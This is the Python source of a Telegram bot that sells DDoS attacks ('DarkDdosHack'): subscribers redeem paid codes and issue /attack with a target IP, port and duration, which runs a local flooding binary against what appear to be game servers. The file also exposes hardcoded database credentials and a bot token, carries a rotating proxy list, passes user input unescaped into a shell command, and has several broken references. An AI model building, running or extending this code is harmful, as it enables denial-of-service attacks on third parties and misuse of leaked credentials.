import asyncio
import random
import string
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

MONGO_URI = 'mongodb+srv://Vampirexcheats:vampirexcheats1@cluster0.omdzt.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['rbbl']
users_collection = db['VAMPIREXCHEATS']
redeem_codes_collection = db['redeem_codes0']

TELEGRAM_BOT_TOKEN = '7947138730:AAHiIS6-UxyEMB7o_IRWPjwgaM_SwjSoHM0'
ADMIN_USER_ID = 5344691638 

cooldown_dict = {}
user_attack_history = {}
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334", 
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*💦💣 /start* - Start interacting with the bot.\n"
            "*💦💣 /attack* - Trigger an attack operation.\n"
            "*💦💣 /redeem* - Redeem a code.\n"
            "*💦💣 /get_id* - Get Your Id?.\n"
        )
    else:
        help_text = (
            "*☄️ Available Commands for Admins:*\n\n"
            "*💦💣 /start* - Start the bot.\n"
            "*💦💣 /attack* - Start the attack.\n"
            "*💦💣 /get_id* - Get user id.\n"
            "*💦💣 /remove [user_id]* - Remove a user.\n"
            "*💦💣 /users* - List all allowed users.\n"
            "*💦💣 /gen* - Generate a redeem code.\n"
            "*💦💣 /redeem* - Redeem a code.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')
    
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  
    user_name = update.effective_user.first_name  
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚡️𝗗𝗔𝗥𝗞⋆𝗗𝗗𝗢𝗦⋆𝗛𝗔𝗖𝗞 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗛𝗼𝗺𝗲 🪂\n 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @DarkDdosHack*", parse_mode='Markdown')
        return

    message = (
        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗯𝗮𝘁𝘁𝗹𝗲𝗳𝗶𝗲𝗹𝗱! 🔥*\n\n"
        "*𝗨𝘀𝗲 /𝗮𝘁𝘁𝗮𝗰𝗸 <𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>*\n"
        "*𝗟𝗲𝘁 𝘁𝗵𝗲 𝘄𝗮𝗿 𝗯𝗲𝗴𝗶𝗻! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@DarkDdosHack*", parse_mode='Markdown')
        return
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /a <user_id> <days/minutes>*", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    users_collection.delete_one({"user_id": target_user_id})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    
    # Check user authorization
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@DarkDdosHack*", parse_mode='Markdown')
        return
    
    # Validate attack arguments
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*📝 𝗨𝘀𝗮𝗴𝗲: /attack <target> <port> <time>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 80 120\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 3 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*", parse_mode='Markdown')
        return
    
    ip, port, duration = args
    
    # Validate IP
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*glt h bahen chod💦💦💦.*", parse_mode='Markdown')
        return
    
    # Validate duration
    try:
        duration = int(duration)
        if duration > 240:  # New duration limit
            response = "*ruk madharcod 🥵180 lgale lode.*" 
            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown') 
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*glt ip dalta h madharcod 😡.*", parse_mode='Markdown')
        return
    
    # Cooldown check
    cooldown_period = 10
    current_time = datetime.now()
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*Wait {remaining_time} seconds before next attack*",
                parse_mode='Markdown'
            )
            return
    
    # Attack history check
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="*pahle hi chod diya h to baar baar kya gand dega!*", parse_mode='Markdown')
        return
    
    # Update cooldown and attack history
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))
    
    # Send attack confirmation
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
        f"*🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!*\n"
        f"*🎯 Target Locked: {ip}:{port}*\n"
        f"*⏳ Countdown: {duration} seconds*\n"
        f"*🔥chudai chalu h feedback bhej dena @DarkDdosOwner💥*"
    ), parse_mode='Markdown')

    # Run attack asynchronously
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
    
async def DarkDdosOwner(update: Update, context: CallbackContext):
    user_id = update.effective_user.id 
    message = f"YOUR USER ID: `{user_id}`" 
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./dark {ip} {port} {duration} 800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅*\n*😈Bas maal gir gya! 💦💦💦*\n*BGMI KO CHODNE WALE FEEDBACK DE @DarkDdosOwner!*", parse_mode='Markdown')

async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*tere bas ki nhi h lode!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return
    max_uses = 1
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return
    if time_input[-1].lower() == 'd':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day"
    elif time_input[-1].lower() == 'm':  
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [], 
        "max_uses": max_uses,
        "redeem_count": 0
    })
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )
    await context.bot.send_message(chat_id=chat_id, text="*𝗪𝗔𝗛 💣 𝗕𝗚𝗠𝗜 𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗡𝗘 𝗞𝗘 𝗟𝗜𝗬𝗘 !*\𝗻*𝗖𝗢𝗗𝗘 𝗥𝗘𝗗𝗘𝗘𝗠 🫣𝗞𝗥 𝗟𝗜𝗬𝗔✅.*", parse_mode='Markdown')

async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return
    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60  
        remaining_minutes = max(1, remaining_minutes)  
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440  
            remaining_hours = (remaining_minutes % 1440) // 60  
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)" 
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')
    
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False
    
async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find()    
    user_list_message = "👥 User List:\n" 
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)  
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False      
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("get_id", DarkDdosOwner))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("pxy_update", update_proxy_command))
    
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
